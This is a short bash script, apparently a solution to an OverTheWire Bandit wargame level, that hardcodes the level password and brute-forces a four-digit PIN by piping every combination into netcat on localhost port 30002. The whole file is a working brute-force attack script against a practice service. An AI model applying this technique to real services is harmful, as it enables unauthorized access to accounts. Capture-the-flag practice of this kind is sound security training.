#!/bin/bash
passwd24=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
for i in {0000..9999}; do
            echo "$passwd24 $i"
done | nc localhost 30002  | grep -v Wrong | grep -v "I am the pincode checker for user bandit25"
